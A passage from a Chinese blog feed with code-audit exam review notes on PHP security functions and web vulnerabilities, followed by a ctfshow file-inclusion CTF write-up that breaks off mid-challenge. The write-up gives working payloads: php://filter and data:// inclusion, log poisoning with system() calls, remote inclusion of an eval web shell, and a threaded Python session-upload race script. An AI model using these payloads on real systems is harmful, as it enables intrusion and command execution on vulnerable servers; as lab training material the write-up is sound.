title="第33题"></a>第33题</h2><p>反射型XSS是非持久性，参数型的跨站脚本。是目前最普遍的类型，这种攻击方式往往具有一次性。发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS代码。这个过程像一次反射，所以称反射型XSS。<br>存储型XSS是持久性跨站脚本。持久性体现在XSS代码不是在某个参数(变量)中，而是写入数据库或文件等可以永久保存的介质中。</p><h2 id="第34题"><a href="#第34题" class="headerlink" title="第34题"></a>第34题</h2><p>include() 文件包含过程中出现错误，抛出警告，之后继续正常执行<br>include_once() 与require()函数相同，但文件只包含第一次<br>require() 文件包含过程中出现错误，抛出错误，退出程序执行<br>require_once() 与include()函数相同，但文件只包含第一次<br>highlight_file()    打印输出或者返回 filename 文件中语法高亮版本的代码</p><h2 id="第35题"><a href="#第35题" class="headerlink" title="第35题"></a>第35题</h2><p><code>system()</code> 执行系统命令，输出执行结果<br><code>exec()</code> 执行系统命令，不输出结果，返回执行结果数组<br><code>passthru()</code> 执行系统命令，输出执行结果（支持二进制）<br><code>shell_exec()</code> 执行系统命令，不输出结果，返回执行结果字符串<br><code>popen()</code> 执行系统命令，不输出结果，返回一个资源类型<br>反引号（`）执行系统命令，不输出结果，返回执行结果字符串</p><h2 id="第36题"><a href="#第36题" class="headerlink" title="第36题"></a>第36题</h2><p>非对称加密与对称加密不一样的地方在于，非对称加密算法有两个密钥，分别为公钥和私钥，它的安全性比对称加密更好，公钥用来加密，私钥用来解密。</p><h2 id="第37题"><a href="#第37题" class="headerlink" title="第37题"></a>第37题</h2><p>文件上传漏洞大多出现在可以进行文件上传的地方，如用户头像上传，文档上传处等。</p><h2 id="第38题"><a href="#第38题" class="headerlink" title="第38题"></a>第38题</h2><p>eval()和assert()函数导致的代码执行漏洞大多是因为载入缓存或者模板以及对变量的处理不严格导致</p><h2 id="第39题"><a href="#第39题" class="headerlink" title="第39题"></a>第39题</h2><h3 id="escapeshellcmd-函数"><a href="#escapeshellcmd-函数" class="headerlink" title="escapeshellcmd()函数"></a>escapeshellcmd()函数</h3><p>shell元字符转义</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">escapeshellcmd</span>(<span class="keyword">string</span> <span class="variable">$command</span>): <span class="keyword">string</span></span><br></pre></td></tr></table></figure><p>escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。escapeshellcmd() 应被用在完整的命令字符串上。escapeshellcmd() 不会对空格转义。</p><ul><li>参数<br>command，要转义的命令</li><li>返回值<br>转义后的字符串</li></ul><h2 id="第42题"><a href="#第42题" class="headerlink" title="第42题"></a>第42题</h2><p>常见的Web漏洞：</p><ol><li>SQL注入漏洞</li><li>XSS漏洞</li><li>CSRF漏洞</li><li>文件操作漏洞</li><li>代码执行漏洞</li><li>命令执行漏洞</li><li>变量覆盖漏洞</li><li>逻辑处理漏洞</li><li>会话认证漏洞</li></ol><h2 id="第43题"><a href="#第43题" class="headerlink" title="第43题"></a>第43题</h2><p>SQL注入漏洞的主要利用方式：</p><ol><li>宽字节注入</li><li>二次urlencode注入</li><li>联合注入</li><li>布尔盲注</li><li>时间盲注</li><li>堆叠注入</li></ol><h2 id="第44题"><a href="#第44题" class="headerlink" title="第44题"></a>第44题</h2><p><img src="/simg/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.png" alt="二次漏洞攻击流程图"></p><h1 id="第3套试题"><a href="#第3套试题" class="headerlink" title="第3套试题"></a>第3套试题</h1><h2 id="第1题-2"><a href="#第1题-2" class="headerlink" title="第1题"></a>第1题</h2><p>PHP_INI_USER可在用户脚本（例如ini_set()或Windows注册表以及.user.ini中设定）<br>PHP_INI_PERDIR可在 php.ini，.htaccess 或 httpd.conf 中设定<br>PHP_INI_SYSTEM可在 php.ini 或 httpd.conf 中设定<br>PHP_INI_ALL可在任何地方设定</p><h2 id="第5题-2"><a href="#第5题-2" class="headerlink" title="第5题"></a>第5题</h2><p>allow_url_include &#x3D; Off (禁止引用URL文件,新版增加功能,预设关闭)<br>allow_url_include &#x3D; On (允许引用URL文件,新版增加功能)<br>远程文件包含需要设置为on</p><p>绝大多数的文件包含都需要配合截断进行,因为我们不能写入以.php为拓展名的文件</p><p>当被包含的文件在服务器本地时，称为本地文件包含。<br>当被包含的文件在第三方服务器时，称为远程文件包含。</p><h2 id="第7题-2"><a href="#第7题-2" class="headerlink" title="第7题"></a>第7题</h2><p>正则表达式中的点号(.)匹配除换行符(\n)之外的任意一个字符。</p><h2 id="第8题-2"><a href="#第8题-2" class="headerlink" title="第8题"></a>第8题</h2><p>PHP的命令执行漏洞主要是基于一些函数的参数过滤不足导致</p><h3 id="proc-open-函数"><a href="#proc-open-函数" class="headerlink" title="proc_open()函数"></a>proc_open()函数</h3><p>执行一个命令，并且打开用来输入&#x2F;输出的文件指针。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">proc_open</span>(</span><br><span class="line">    <span class="keyword">array</span>|<span class="keyword">string</span> <span class="variable">$command</span>,</span><br><span class="line">    <span class="keyword">array</span> <span class="variable">$descriptor_spec</span>,</span><br><span class="line">    <span class="keyword">array</span> &amp;<span class="variable">$pipes</span>,</span><br><span class="line">    ?<span class="keyword">string</span> <span class="variable">$cwd</span> = <span class="literal">null</span>,</span><br><span class="line">    ?<span class="keyword">array</span> <span class="variable">$env_vars</span> = <span class="literal">null</span>,</span><br><span class="line">    ?<span class="keyword">array</span> <span class="variable">$options</span> = <span class="literal">null</span></span><br><span class="line">): resource|<span class="literal">false</span></span><br></pre></td></tr></table></figure><ul><li>参数<br>command<br>以string形式执行的命令行。<br>descriptor_spec<br>一个索引数组。 数组的键表示描述符，数组元素值表示 PHP 如何将这些描述符传送至子进程。 0 表示标准输入（stdin），1 表示标准输出（stdout），2 表示标准错误（stderr）。<br>pipes<br>将被置为索引数组， 其中的元素是被执行程序创建的管道对应到 PHP 这一端的文件指针。</li><li>返回值<br>返回表示进程的资源类型，当使用完毕之后，请调用 proc_close() 函数来关闭此资源。 如果失败，返回 false。</li></ul><h2 id="第15题-2"><a href="#第15题-2" class="headerlink" title="第15题"></a>第15题</h2><p>安全的API登录需求：</p><ol><li>登录密钥不可预测并且不固定，生成key的算法中加入随机字符</li><li>API接口禁止搜索引擎收录</li><li>登录密钥绑定当前主机，换机器不可用</li></ol><h2 id="第16题-1"><a href="#第16题-1" class="headerlink" title="第16题"></a>第16题</h2><p>针对撞库漏洞比较好的解决方案是 使用登录验证码和多因素验证。</p><h2 id="第17题-1"><a href="#第17题-1" class="headerlink" title="第17题"></a>第17题</h2><p>cookie 是访问过的网站创建的文件，用于存储浏览信息，例如个人资料信息。<br>Opera允许cookie多达4096个字节，包括：名（name）、值（value）和等号。 Internet Explorer允许cookie多达4095个字节，包括：名（name）、值（value）和等号。 注：多字节字符计算为两个字节。 在所有浏览器中，任何cookie大小超过限制都被忽略，且永远不会被设置。<br>cookie 有两种清除方式：<br>通过浏览器工具清除 cookie (有第三方的工具，浏览器自身也有这种功能)<br>通过设置 cookie 的有效期来清除 cookie</p><h2 id="第21题-2"><a href="#第21题-2" class="headerlink" title="第21题"></a>第21题</h2><p>Fortify SCA 是一个静态的、白盒的软件源代码安全测试工具。它通过内置的五大主要分析引擎：数据流、语义、结构、控制流、配置流等对应用软件的源代码进行静态的分析，分析的过程中与它特有的软件安全漏洞规则集进行全面地匹配、查找，从而将源代码中存在的安全漏洞扫描出来，并给予整理报告。</p><h2 id="第26题-2"><a href="#第26题-2" class="headerlink" title="第26题"></a>第26题</h2><p>攻击者可以利用eval()函数来加载自定义的PHP扩展以突破disable_functions指令的限制</p><h2 id="第27题-1"><a href="#第27题-1" class="headerlink" title="第27题"></a>第27题</h2><p>安全过滤文件：通常文件名中包含 filter 、 safe 、 check 等关键字，这类文件主要是对参数进行过滤，关系到我们找到的可疑点能否利用。</p><h2 id="第31题-1"><a href="#第31题-1" class="headerlink" title="第31题"></a>第31题</h2><p>代码审计思路中，根据敏感函数回溯参数过程<br>优点：<br>只需搜索相应敏感关键字，即可以快速地挖掘想要的漏洞，具有可定向挖掘和高效、高质量的优点。<br>缺点：<br>挖掘漏洞时定位利用点会花费一些时间，另外对逻辑漏洞挖掘覆盖不到。</p><h2 id="第32题-1"><a href="#第32题-1" class="headerlink" title="第32题"></a>第32题</h2><h3 id="问题1"><a href="#问题1" class="headerlink" title="问题1"></a>问题1</h3><p>代码的作用是判断“install.lock”文件是否存在且变量action是否不等于upgrade和installed。如果三个条件均满足，则使用header()函数跳转到首页。</p><h3 id="问题2"><a href="#问题2" class="headerlink" title="问题2"></a>问题2</h3><p>问题出在使用header()函数跳转，PHP程序没有退出，仍然会进入安装流程。利用方式是通过GET或POST的方式接收将要跳转的URL，然后通过构造恶意链接进行提交来跳转到目标URL。</p><h2 id="第34题-1"><a href="#第34题-1" class="headerlink" title="第34题"></a>第34题</h2><p>preg_match里的正则表达式仅限制了必须输出4个数字，但没有要求4个数字在什么位置输出。缺少了限制首尾，仅能输出4个数字的正则。严谨的写法应该为: <code>^\d+\.\d+\.\d+\.\d+$</code></p><h2 id="第35题-1"><a href="#第35题-1" class="headerlink" title="第35题"></a>第35题</h2><h3 id="问题1-1"><a href="#问题1-1" class="headerlink" title="问题1"></a>问题1</h3><p><code>if(!get_magic_quotes_gpc())</code> 的判断条件是如果magic_quotes_gpc&#x3D;on,则函数返回true，if语句为false不执行。如果magic_quotes_gpc&#x3D;off,则函数返回false，if语句为true执行。</p><h3 id="问题2-1"><a href="#问题2-1" class="headerlink" title="问题2"></a>问题2</h3><p><code>if(is_array($var))</code> 的作用是判断参数var是否为数组，如果为数组则执行if语句，否则不执行。<br><code>foreach</code> 语句的作用是对数组内每个值递归调用函数，防止未进行addslashes过滤。</p><h3 id="问题3"><a href="#问题3" class="headerlink" title="问题3"></a>问题3</h3><p>如果变量var小于等于0或变量里具有cfg_,GLOBALS,_GET,_POST,_COOKIE的其中之一则执行exit函数。</p><h3 id="问题4"><a href="#问题4" class="headerlink" title="问题4"></a>问题4</h3><p>addslashes()函数的作用是对 <code>&#39;  &quot;  \  null字符</code> 添加反斜杠（\）来转义。过滤掉危险字符。</p><h1 id="第4套试题"><a href="#第4套试题" class="headerlink" title="第4套试题"></a>第4套试题</h1><h2 id="第2题-2"><a href="#第2题-2" class="headerlink" title="第2题"></a>第2题</h2><h3 id="safe-mode"><a href="#safe-mode" class="headerlink" title="safe_mode"></a>safe_mode</h3><p>在Safe mode下无法使用的函数有shell_exec()，exec()，system()，passthru()，popen()等。<br><a href="http://php.adamharvey.name/manual/zh/features.safe-mode.functions.php">Safe mode下不能使用的函数</a></p><h3 id="open-basedir"><a href="#open-basedir" class="headerlink" title="open_basedir"></a>open_basedir</h3><p>open_basedir加载外部脚本时，多个目录以冒号(:)分割</p><h3 id="display-errors"><a href="#display-errors" class="headerlink" title="display_errors"></a>display_errors</h3><p>配置error_reporting时，需要开启display_errors&#x3D;on</p><h2 id="第3题-2"><a href="#第3题-2" class="headerlink" title="第3题"></a>第3题</h2><p>浏览器扩展工具：Hackbar, Firebug, Modify</p><h2 id="第5题-3"><a href="#第5题-3" class="headerlink" title="第5题"></a>第5题</h2><h3 id="parse-str-函数"><a href="#parse-str-函数" class="headerlink" title="parse_str()函数"></a>parse_str()函数</h3><p>作用是变量覆盖</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">parse_str</span> ( <span class="keyword">string</span> <span class="variable">$encoded_string</span> [, <span class="keyword">array</span> &amp;<span class="variable">$result</span> ] ) : <span class="keyword">void</span></span><br></pre></td></tr></table></figure><p>如果 encoded_string 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 result 则会设置到该数组里 ）。如果传入的字符串的键名是数组里没有的变量则会创建一个新的变量并赋值给它。如果是已有的变量但值不同，则字符串的键值会覆盖原来的值。</p><h2 id="第6题-2"><a href="#第6题-2" class="headerlink" title="第6题"></a>第6题</h2><p>抽奖和投票漏洞有以下几种利用方法：</p><ol><li>cookie或POST请求正文绕过</li><li>基于IP验证</li><li>基于用户认证</li></ol><h2 id="第7题-3"><a href="#第7题-3" class="headerlink" title="第7题"></a>第7题</h2><p>文件包含漏洞大多出现在模块加载，模板加载和cache调用的地方</p><h2 id="第9题-2"><a href="#第9题-2" class="headerlink" title="第9题"></a>第9题</h2><h3 id="array-map-函数"><a href="#array-map-函数" class="headerlink" title="array_map()函数"></a>array_map()函数</h3><p>为数组的每个元素应用回调函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_map</span>(?<span class="keyword">callable</span> <span class="variable">$callback</span>, <span class="keyword">array</span> <span class="variable">$array</span>, <span class="keyword">array</span> ...<span class="variable">$arrays</span>): <span class="keyword">array</span></span><br></pre></td></tr></table></figure><p>array_map() 返回一个 array，包含将 array 的相应值作为回调的参数顺序调用 callback 后的结果（如果提供了更多数组，还会利用 arrays 传入）。callback 函数形参的数量必须匹配 array_map() 实参中数组的数量。多余的实参数组将会被忽略。如果提供的实参数组的数量不足，将抛出 ArgumentCountError。<br><a href="https://www.php.net/manual/zh/function.array-map.php">array_map</a></p><h2 id="第10题-2"><a href="#第10题-2" class="headerlink" title="第10题"></a>第10题</h2><h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><p>\w  匹配字母、数字、下划线。等价于 [A-Za-z0-9_]<br>正则表达式修饰符 i、g、m、s、U、x、a、D、e 等。<br>i  不区分大小写<br>g  全局匹配<br>m  多行匹配<br>e  配合函数preg_replace()使用，可以把匹配来的字符串当正则表达式执行</p><h2 id="第17题-2"><a href="#第17题-2" class="headerlink" title="第17题"></a>第17题</h2><p>php:&#x2F;&#x2F;input是php语言中一个只读的数据流；通过”php:&#x2F;&#x2F;input”，可以读取从Http客户端以POST方式提交、请求头“Content-Type”值非”multipart&#x2F;form-data”的所有数据<br>multipart&#x2F;form-data的基础方式是post</p><h2 id="第19题-1"><a href="#第19题-1" class="headerlink" title="第19题"></a>第19题</h2><p>HTML实体编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&amp;   &amp;amp; 或 &amp;#38;</span><br><span class="line">&quot;   &amp;quot; 或 &amp;#34;</span><br><span class="line">&#x27;   &amp;apos; 或 &amp;#39;</span><br><span class="line">&gt;  &amp;gt; 或 &amp;#62;</span><br></pre></td></tr></table></figure><h2 id="第22题-2"><a href="#第22题-2" class="headerlink" title="第22题"></a>第22题</h2><p>BugFree3.0.2重装漏洞是因为仅仅使用了header(),并没有使用die()或者exit()等函数退出程序流程，这个跳转只是HTTP头的跳转，下方代码依然会继续执行.</p><h2 id="第28题-1"><a href="#第28题-1" class="headerlink" title="第28题"></a>第28题</h2><p>验证码不刷新直接绕过的原因是后端程序在接受一次请求后，并没有主动刷新验证码。</p><h2 id="第30题-1"><a href="#第30题-1" class="headerlink" title="第30题"></a>第30题</h2><p>CSRF主要是用于越权操作。</p><h2 id="第33题-1"><a href="#第33题-1" class="headerlink" title="第33题"></a>第33题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0</span><br><span class="line">\0\&#x27;</span><br><span class="line">\\&#x27;</span><br></pre></td></tr></table></figure><h2 id="第34题-2"><a href="#第34题-2" class="headerlink" title="第34题"></a>第34题</h2><p>安全问题：<br>正则表达式里面扩展名前面的点(.)没有进行转义，导致变成了全匹配符。如果这时候提交的文件名为’xxx.php%00jpg’,则会绕过检查并写入一个PHP文件。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;考试即将到来，复习刻不容缓。复习题由某群友整理得到。&lt;/p&gt;</summary>
    
    
    
    <category term="代码审计" scheme="http://example.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="期末专题" scheme="http://example.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E6%9C%9F%E6%9C%AB%E4%B8%93%E9%A2%98/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="期末" scheme="http://example.com/tags/%E6%9C%9F%E6%9C%AB/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-web入门-文件包含</title>
    <link href="http://example.com/2022/12/31/ctfshow-web%E5%85%A5%E9%97%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>http://example.com/2022/12/31/ctfshow-web%E5%85%A5%E9%97%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
    <published>2022-12-30T16:00:00.000Z</published>
    <updated>2023-01-16T09:06:16.270Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>文件包含不够熟练，需要增加熟练度。</p><span id="more"></span><h1 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h1><ol><li><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过GET方式传入参数file，如果变量file不为空，则通过include函数进行文件包含。</p></li><li><p>构造payload<br>通过php伪协议构造payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>成功拿到flag</p></li></ol><h1 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h1><ol><li><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过GET方式传入参数file，如果变量不为空，并且其中不含php，则通过include函数包含文件。</p></li><li><p>构造payload<br>由于不能包含php，所以不能使用php伪协议，改为用data伪协议绕过。<br>通过shell_code命令执行(``)读取flag.php的内容<br>或者用base64加密可以使用php<br>构造payload如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data:text/plain,&lt;?= `tac f*`;?&gt;</span><br></pre></td></tr></table></figure><p>成功拿到flag</p></li></ol><h1 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h1><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li>目录地址<br>日志地址通常为<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/var/log/nginx/error.log</span><br><span class="line">/var/log/nginx/access.log</span><br><span class="line">一般apache日志在类似目录下(/var/log/httpd/access.log)</span><br></pre></td></tr></table></figure>根据官方的Hint，可以尝试访问：<br><code>http://url/?file=/var/log/nginx/access.log</code><br>通过burp抓包可以得到user-agent和Referer字段，由此我们可以尝试在User-agent或Referer处注入命令执行代码</li></ul><ol start="2"><li>构造payload<br>首先注入能显示文件的代码<br><code>&lt;?php echo system(&#39;ls&#39;);?&gt;</code><br>发现flag文件为fl0g.php后，执行显示的代码：<br><code>&lt;?php echo system(&#39;cat fl0g.php&#39;);?&gt;</code></li></ol><p>或者采用另一种方法：<br>远程文件包含<br>xxx为自己服务器地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=http://xxxx/shell.txt</span><br><span class="line">shell.txt中内容</span><br><span class="line">&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure><p>成功拿到flag</p><h1 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h1><p>方式同上</p><h1 id="web82-86"><a href="#web82-86" class="headerlink" title="web82-86"></a>web82-86</h1><p>原理可以看看这篇文章：<a href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a><br>Python脚本如下：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">sess = <span class="string">&#x27;123&#x27;</span></span><br><span class="line">url1 = <span class="string">&quot;http://f90712a3-dacd-4f10-a4af-3fb63dfc16e4.challenge.ctf.show/&quot;</span></span><br><span class="line">url2 = <span class="string">&#x27;http://f90712a3-dacd-4f10-a4af-3fb63dfc16e4.challenge.ctf.show/?file=/tmp/sess_&#x27;</span> + sess</span><br><span class="line"></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data2 = &#123;</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;system(&quot;cat f*&quot;);&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">file = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>: <span class="string">&#x27;abc&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: sess</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = session.post(url1, data=data1, files=file, cookies=cookies)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = session.post(url2, data=data2)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;ctfshow&#123;&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">threads = [threading.Thread(target=write),</span><br><span class="line">           threading.Thread(target=read)]</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">    t.start()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这段代码使用了 Python 的 requests 库来对一个特定的 URL 进行攻击。它创建了两个线程，一个线程执行写操作，另一个线程执行读操作。</p><p>在写操作线程中，它会不断地以 <code>multipart/form-data</code> 的形式向 URL1 发送 POST 请求，其中包含一个文件和一个名为 <code>PHP_SESSION_UPLOAD_PROGRESS</code> 的数据。这个文件的内容是<code>&lt;?php eval($_POST[1]);?&gt;</code> 。</p><p>在读操作线程中，它会不断地向 URL2 发送 POST 请求，其中包含一个名为 1 的数据，值为 <code>system(&quot;cat f*&quot;);</code> 。这个请求会使得在服务器上执行 cat f* 的命令。如果返回的结果中包含 ctfshow{ ，它会将返回的结果打印出来.</p><p>这段代码使用了多线程的技术，可以同时进行写和读操作，最终目的是构造出一个能够执行系统命令的 payload，在返回的结果中寻找flag。</p><p>这种攻击方式是由于服务器上存在文件上传漏洞而导致的，由于服务器没有对文件的内容进行限制，攻击者可以上传一个带有恶意代码的文件，使得服务器执行恶意代码，达到攻击目的。</p><h1 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h1><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ 